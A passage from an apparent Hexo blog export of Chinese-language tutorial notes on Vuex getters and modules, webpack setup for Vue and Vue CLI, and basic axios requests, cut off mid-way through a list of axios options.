state.student.filter(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> item.age &gt;= <span class="number">20</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 引用其他getters方法获取处理值</span></span><br><span class="line">    <span class="function"><span class="title">more20stuLen</span>(<span class="params">state, getters</span>)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> getters.more20stu.length</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//实现动态传参</span></span><br><span class="line">    <span class="function"><span class="title">moreAgestu</span>(<span class="params">state</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="function"><span class="params">age</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> state.student.filter(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> item.age &gt;= age</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<code>App.vue</code><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.state.counter&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.getters.powerCounter&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.getters.more20stu&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.getters.more20stuLen&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.getters.moreAgestu(30)&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="对象解构"><a href="#对象解构" class="headerlink" title="对象解构"></a>对象解构</h2><ul>
<li>这种方式可以将<code>context</code>内的值赋值给相应的参数</li>
<li><pre><code class="javascript">const context = &#123;
  state; &#39;xxx&#39;,
  commit: &#39;yyy&#39;,
  rootState: &#39;zzz&#39;
&#125;
const &#123;state, commit, rootState&#125; = context
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 这样操作所得：&#96;state &#x3D; context.state,commit &#x3D; context.commit,rootState &#x3D; context.rootState&#96;</span><br><span class="line">- &#96;modules&#96;中的实例</span><br><span class="line">  &#96;&#96;&#96;javascript</span><br><span class="line">  const moduleA &#x3D;&#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">      name: &#39;2020&#x2F;08&#x2F;07&#39;</span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;</span><br><span class="line">      updata(state) &#123;</span><br><span class="line">        state.name &#x3D; &#39;08&#x2F;07&#39;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    action: &#123;</span><br><span class="line">      &#x2F;&#x2F;对象解构</span><br><span class="line">      test (&#123;state, commit, rootState&#125;) &#123;</span><br><span class="line">        console.log(state.name);</span><br><span class="line">        commit(&#39;updata&#39;);</span><br><span class="line">        console.log(rootState.counter);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
## vuex模块封装
如果项目过大的话代码仅仅放在index.js文件中显得十分拥挤且不利于维护，所以我们可以将模块抽离出来
</code></pre>
</li>
</ul>
<p><code>index.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="keyword">import</span> mutations <span class="keyword">from</span> <span class="string">&quot;@/store/mutations&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> actions <span class="keyword">from</span> <span class="string">&quot;@/store/actions&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> moduleA <span class="keyword">from</span> <span class="string">&quot;@/store/modules/moduleA&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> getters <span class="keyword">from</span> <span class="string">&quot;@/store/getters&quot;</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">  counter: <span class="number">10</span>,</span><br><span class="line">  student: [</span><br><span class="line">    &#123;<span class="attr">name</span>: <span class="string">&#x27;joe&#x27;</span>, <span class="attr">age</span>: <span class="number">21</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">name</span>: <span class="string">&#x27;jack&#x27;</span>, <span class="attr">age</span>: <span class="number">15</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">name</span>: <span class="string">&#x27;curry&#x27;</span>, <span class="attr">age</span>: <span class="number">40</span>&#125;</span><br><span class="line">  ],</span><br><span class="line">  info: &#123;</span><br><span class="line">    age: <span class="number">12</span>,</span><br><span class="line">    name: <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state,</span><br><span class="line">  mutations,</span><br><span class="line">  actions,</span><br><span class="line">  modules: &#123;</span><br><span class="line">    a: moduleA</span><br><span class="line">  &#125;,</span><br><span class="line">  getters</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><code>motations.js</code>(其他文件也与此文件相同)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="function"><span class="title">addCounter</span>(<span class="params">state</span>)</span> &#123;</span><br><span class="line">        state.counter++</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">addCountNum</span>(<span class="params">state, num</span>)</span> &#123;</span><br><span class="line">        state.counter += num</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">addStudent</span>(<span class="params">state, stu</span>)</span> &#123;</span><br><span class="line">        state.student.push(stu)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">updataIn</span>(<span class="params">state</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// Vue.set(state.info,&#x27;address&#x27;,&#x27;ShangHai&#x27;)</span></span><br><span class="line">        <span class="comment">// Vue.delete(state.info,&#x27;age&#x27;)</span></span><br><span class="line">        <span class="comment">// setTimeout(() =&gt; &#123;</span></span><br><span class="line">        <span class="comment">//   state.info.name = &#x27;test&#x27;</span></span><br><span class="line">        <span class="comment">// &#125;,1000)</span></span><br><span class="line">        state.info.name = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Vue-cli</tag>
        <tag>Vuex</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue基础配置</title>
    <url>/2020/11/10/Vue%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="webpack配置Vue"><a href="#webpack配置Vue" class="headerlink" title="webpack配置Vue"></a>webpack配置Vue</h1><h2 id="安装VUE"><a href="#安装VUE" class="headerlink" title="安装VUE"></a>安装VUE</h2><p>此时不需要在后面加’-dev’，’-dev’代表开发环境，而vue是运行时也需要，所以不加’-dev’</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~ npm install vue --save</span><br></pre></td></tr></table></figure>
<h2 id="配置webpack-congfig-js"><a href="#配置webpack-congfig-js" class="headerlink" title="配置webpack.congfig.js"></a>配置webpack.congfig.js</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.export=&#123;</span><br><span class="line">    resolve:&#123;</span><br><span class="line">        alias:&#123; <span class="comment">//别名</span></span><br><span class="line">            <span class="string">&#x27;vue$&#x27;</span>: <span class="string">&#x27;vue/dist/vue.esm.js&#x27;</span> <span class="comment">//指定运行vue文件</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>不启用上述配置的话使用vue会报错，因为vue一开始使用的是runtime-only，这个模式不允许有任何template，而在webpack的js中启动vue相当于template</li>
<li>此时添加以上配置可以改为runtime-compiler，这个模式可以有template，因为有compiler可以用于编译template</li>
</ol>
<h2 id="导入vue"><a href="#导入vue" class="headerlink" title="导入vue"></a>导入vue</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    data:&#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h1 id="Vue创建template"><a href="#Vue创建template" class="headerlink" title="Vue创建template"></a>Vue创建template</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    template:<span class="string">&#x27;&lt;div&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">    data:&#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="template组件替换"><a href="#template组件替换" class="headerlink" title="template组件替换"></a>template组件替换</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> App = &#123;</span><br><span class="line">    template:<span class="string">&#x27;&lt;div&gt;&lt;/div&gt;&#x27;</span>,</span><br><span class="line">    <span class="function"><span class="title">date</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            message:<span class="string">&#x27;hellow&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        <span class="function"><span class="title">btnClick</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    template:<span class="string">&#x27;&lt;App/&gt;&#x27;</span>,</span><br><span class="line">    components:&#123;</span><br><span class="line">        App</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="将组件放入其他js"><a href="#将组件放入其他js" class="headerlink" title="将组件放入其他js"></a>将组件放入其他js</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main.js</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./js/app.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    template:<span class="string">&#x27;&lt;App/&gt;&#x27;</span>,</span><br><span class="line">    components:&#123;</span><br><span class="line">        App</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//app.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    template:<span class="string">&#x27;&lt;div&gt;&#123;&#123;message&#125;&#125;&lt;/div&gt;&#x27;</span>,</span><br><span class="line">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            message:<span class="string">&#x27;hellow&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        <span class="function"><span class="title">btnClick</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="创建vue文件模板"><a href="#创建vue文件模板" class="headerlink" title="创建vue文件模板"></a>创建vue文件模板</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">    name:<span class="string">&#x27;&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="vue文件用webpack封装"><a href="#vue文件用webpack封装" class="headerlink" title="vue文件用webpack封装"></a>vue文件用webpack封装</h2><h3 id="安装相应loader"><a href="#安装相应loader" class="headerlink" title="安装相应loader"></a>安装相应loader</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~ npm install --save-dev vue-loader vue-template-compiler</span><br></pre></td></tr></table></figure>
<h3 id="配置webpack-congfig-js-1"><a href="#配置webpack-congfig-js-1" class="headerlink" title="配置webpack.congfig.js"></a>配置webpack.congfig.js</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">        &#123;</span><br><span class="line">            test: <span class="regexp">/\.vue$/</span>,</span><br><span class="line">            use: [ <span class="string">&#x27;vue-loader&#x27;</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="此时遇到的打包报错问题"><a href="#此时遇到的打包报错问题" class="headerlink" title="此时遇到的打包报错问题"></a>此时遇到的打包报错问题</h3><ul>
<li>“vue-loader”: “^15.9.3”版本太高，14.0.0以上版本需安装插件</li>
<li>解决办法<ol>
<li>安装插件(配置webpack.congfig.js)<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> VueLoaderPlugin = <span class="built_in">require</span>(<span class="string">&#x27;vue-loader/lib/plugin&#x27;</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    plugins: [</span><br><span class="line">        <span class="keyword">new</span> VueLoaderPlugin()</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>降低”vue-loader”版本至14.0.0以下</li>
</ol>
</li>
</ul>
<h1 id="打包html的plugin"><a href="#打包html的plugin" class="headerlink" title="打包html的plugin"></a>打包html的plugin</h1><h2 id="安装plugin"><a href="#安装plugin" class="headerlink" title="安装plugin"></a>安装plugin</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~ npm install html-webpack-plugin --save-dev</span><br></pre></td></tr></table></figure>
<h2 id="配置webpack-congfig-js-2"><a href="#配置webpack-congfig-js-2" class="headerlink" title="配置webpack.congfig.js"></a>配置webpack.congfig.js</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    plugins: [</span><br><span class="line">        <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">            template:<span class="string">&#x27;html/index.html&#x27;</span> <span class="comment">//打包的html文件相对路径</span></span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="删除html文件对js文件的引入"><a href="#删除html文件对js文件的引入" class="headerlink" title="删除html文件对js文件的引入"></a>删除html文件对js文件的引入</h2><p>删除以下对打包后的js的引入引入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../dist/test.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="js压缩的plugin"><a href="#js压缩的plugin" class="headerlink" title="js压缩的plugin"></a>js压缩的plugin</h1><h2 id="安装plugin-1"><a href="#安装plugin-1" class="headerlink" title="安装plugin"></a>安装plugin</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~ npm install uglifyjs-webpack-plugin@1.1.1 --save-dev</span><br></pre></td></tr></table></figure>
<h2 id="配置webpack-congfig-js-3"><a href="#配置webpack-congfig-js-3" class="headerlink" title="配置webpack.congfig.js"></a>配置webpack.congfig.js</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> UglifyJsPlugin = <span class="built_in">require</span>(<span class="string">&#x27;uglifyjs-webpack-plugin&#x27;</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    plugins: [</span><br><span class="line">        <span class="keyword">new</span> UglifyJsPlugin()</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="webpack搭建本地服务器"><a href="#webpack搭建本地服务器" class="headerlink" title="webpack搭建本地服务器"></a>webpack搭建本地服务器</h1><h2 id="安装-119-101-x62-x61-112-x63-x6b-45-100-101-x76-45-x73-x65-x72-x76-x65-114-64-50-x2e-x39-x2e-x33-版本对应VUE-CLI2版本"><a href="#安装-119-101-x62-x61-112-x63-x6b-45-100-101-x76-45-x73-x65-x72-x76-x65-114-64-50-x2e-x39-x2e-x33-版本对应VUE-CLI2版本" class="headerlink" title="安装(&#119;&#101;&#x62;&#x61;&#112;&#x63;&#x6b;&#45;&#100;&#101;&#x76;&#45;&#x73;&#x65;&#x72;&#x76;&#x65;&#114;&#64;&#50;&#x2e;&#x39;&#x2e;&#x33;版本对应VUE-CLI2版本)"></a>安装(<a href="mailto:&#119;&#101;&#x62;&#x61;&#112;&#x63;&#x6b;&#45;&#100;&#101;&#x76;&#45;&#x73;&#x65;&#x72;&#x76;&#x65;&#114;&#64;&#50;&#x2e;&#x39;&#x2e;&#x33;">&#119;&#101;&#x62;&#x61;&#112;&#x63;&#x6b;&#45;&#100;&#101;&#x76;&#45;&#x73;&#x65;&#x72;&#x76;&#x65;&#114;&#64;&#50;&#x2e;&#x39;&#x2e;&#x33;</a>版本对应VUE-CLI2版本)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~ npm install webapck-dev-server@2.9.3 --save-dev </span><br></pre></td></tr></table></figure>
<h2 id="配置webpack-congfig-js-4"><a href="#配置webpack-congfig-js-4" class="headerlink" title="配置webpack.congfig.js"></a>配置webpack.congfig.js</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    devServer: &#123;</span><br><span class="line">        contentBase : <span class="string">&#x27;./dist&#x27;</span>， <span class="comment">//要服务的文件夹</span></span><br><span class="line">        inline: <span class="literal">true</span>, <span class="comment">//表示是否需要时时进行监听</span></span><br><span class="line">        port: <span class="number">8080</span>, <span class="comment">//指定端口号</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="配置package-json"><a href="#配置package-json" class="headerlink" title="配置package.json"></a>配置package.json</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">  &quot;dev&quot;: &quot;webpack-dev-server --open&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p>‘–open’表示运行时自动打开网页</p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~ npm run dev</span><br></pre></td></tr></table></figure>

<h1 id="VUE-CLI基础"><a href="#VUE-CLI基础" class="headerlink" title="VUE-CLI基础"></a>VUE-CLI基础</h1><h2 id="全局安装vue-cli"><a href="#全局安装vue-cli" class="headerlink" title="全局安装vue/cli"></a>全局安装vue/cli</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~ npm install @vue&#x2F;cli -g</span><br></pre></td></tr></table></figure>
<h2 id="拉取-2-x-模板-旧版本"><a href="#拉取-2-x-模板-旧版本" class="headerlink" title="拉取 2.x 模板 (旧版本)"></a>拉取 2.x 模板 (旧版本)</h2><ul>
<li>安装桥接工具<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~ npm install -g @vue&#x2F;cli-init</span><br></pre></td></tr></table></figure></li>
<li>创建2.x版本项目<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~ vue init webpack 项目名称</span><br></pre></td></tr></table></figure>
<h2 id="创建VUE-CLI4项目"><a href="#创建VUE-CLI4项目" class="headerlink" title="创建VUE-CLI4项目"></a>创建VUE-CLI4项目</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~ vue create 项目名称</span><br></pre></td></tr></table></figure>
<h2 id="VUE-CLI4项目文件信息"><a href="#VUE-CLI4项目文件信息" class="headerlink" title="VUE-CLI4项目文件信息"></a>VUE-CLI4项目文件信息</h2></li>
<li>src/main.js  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//是否显示提示信息</span></span><br></pre></td></tr></table></figure></li>
<li>.gitignore（git忽略的文件集）</li>
<li>babel.config.js（ES语法转换）</li>
<li>package.json（依赖包等版本信息）</li>
<li>public/index.html(主页)</li>
<li>src/components(组件文件夹)</li>
</ul>
<h2 id="VUE-CLI4配置文件的查看和修改"><a href="#VUE-CLI4配置文件的查看和修改" class="headerlink" title="VUE-CLI4配置文件的查看和修改"></a>VUE-CLI4配置文件的查看和修改</h2><ol>
<li>使用cmd运行命令,进入Vue项目管理界面，导入相应项目后进入配置文件信息界面 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~ vue ui</span><br></pre></td></tr></table></figure></li>
<li>node_modules文件夹里查看（node_modules/@vue/cli-service/webpack.comfig.js）</li>
<li>自己创建’vue.config.js’文件，里面的配置会自动进行合并</li>
</ol>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Vue-cli</tag>
      </tags>
  </entry>
  <entry>
    <title>axios基础使用</title>
    <url>/2020/11/10/axios%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="axios学习"><a href="#axios学习" class="headerlink" title="axios学习"></a>axios学习</h1><h2 id="安装axios"><a href="#安装axios" class="headerlink" title="安装axios"></a>安装axios</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install axios --save</span><br></pre></td></tr></table></figure>
<h2 id="axios基本使用"><a href="#axios基本使用" class="headerlink" title="axios基本使用"></a>axios基本使用</h2><ul>
<li>基本格式  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios(&#123;</span><br><span class="line">    url: <span class="string">&#x27;http://123.207.32.32:8000/home/multidata&#x27;</span>,</span><br><span class="line">    method: <span class="string">&#x27;get&#x27;</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li>使用axios自带的方法替换method等参数  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.get(<span class="string">&#x27;http://123.207.32.32:8000/home/multidata&#x27;</span>).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;)</span><br><span class="line">axios.post(<span class="string">&#x27;http://123.207.32.32:8000/home/multidata&#x27;</span>).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li>axios的url传参方式</li>
</ul>
<ol>
<li>拼接在url后面 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios(&#123;</span><br><span class="line">    url: <span class="string">&quot;http://123.207.32.32:8000/home/multidata?type=test&amp;page=1&quot;</span>,</span><br><span class="line">    method: <span class="string">&#x27;get&#x27;</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li>使用params参数 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios(&#123;</span><br><span class="line">    url: <span class="string">&#x27;http://123.207.32.32:8000/home/multidata&#x27;</span>,</span><br><span class="line">    params: &#123;</span><br><span class="line">        type: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">        page: <span class="number">1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    method: <span class="string">&#x27;get&#x27;</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="axios的all方法"><a href="#axios的all方法" class="headerlink" title="axios的all方法"></a>axios的all方法</h2></li>
</ol>
<ul>
<li>基本用法（返回的result是一个数组）  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//格式</span></span><br><span class="line"><span class="comment">//axios.all([axios(), axios()]).then()</span></span><br><span class="line">axios.all([axios(&#123;</span><br><span class="line">    url: <span class="string">&#x27;http://123.207.32.32:8000/home/multidata&#x27;</span></span><br><span class="line">&#125;), axios(&#123;</span><br><span class="line">    url: <span class="string">&#x27;http://123.207.32.32:8000/home/data&#x27;</span>,</span><br><span class="line">    params: &#123;</span><br><span class="line">        type: <span class="string">&#x27;sell&#x27;</span>,</span><br><span class="line">        page: <span class="number">4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)]).then(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li>使用axios.spread将数组拆分  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.all([axios(&#123;</span><br><span class="line">    url: <span class="string">&#x27;http://123.207.32.32:8000/home/multidata&#x27;</span></span><br><span class="line">&#125;), axios(&#123;</span><br><span class="line">    url: <span class="string">&#x27;http://123.207.32.32:8000/home/data&#x27;</span>,</span><br><span class="line">    params: &#123;</span><br><span class="line">        type: <span class="string">&#x27;sell&#x27;</span>,</span><br><span class="line">        page: <span class="number">4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)]).then(axios.spread( <span class="function">(<span class="params">res1, res2</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res1);</span><br><span class="line">    <span class="built_in">console</span>.log(res2);</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure>
<h2 id="axios全局配置"><a href="#axios全局配置" class="headerlink" title="axios全局配置"></a>axios全局配置</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.defaults.baseURL = <span class="string">&#x27;http://123.207.32.32:8000&#x27;</span></span><br><span class="line">                        <span class="comment">//毫秒</span></span><br><span class="line">axios.defaults.timeout = <span class="number">5000</span> </span><br></pre></td></tr></table></figure>
常用配置选项</li>
<li>请求地址<ul>
<li>url: ‘/user’</li>
</ul>
</li>
<li>请求类型<ul>
<li>method: ‘get’</li>
</ul>
</li>
<li>请求根路径<ul>
<li>baseURL: ‘<a href="http://www.mt.com&/#39;">http://www.mt.com&#39;</a></li>
</ul>
</li>
<li>请求前数据处理<ul>
<li>transformRequest: [function(data){}]</li>
</ul>
</li>
<li>请求后数据处理<ul>
<li>transformResponse: [function(data){}]</li>
</ul>
</li>
<li>自定义的请求头<ul>
<li>headers: {‘x-Requested-With’:’XMLHttpRequest’}</li>
</ul>
</li>
<li>URL查询对象<ul>
<li>params: { id: 0 }</li>
</ul>
</li>
<li>查询对象序列化函数<ul>
<li>paramsSerializer: function(params){}</li>
</ul>
</li>
<li>request body<ul>
<li>data: { key: ‘xx’ }</li>
</ul>
</li>
<li>超时设置(单位为毫秒)<ul>
<li>timeout: 1000</li>
</ul>
</li>
<li>跨域是否带Token<ul>
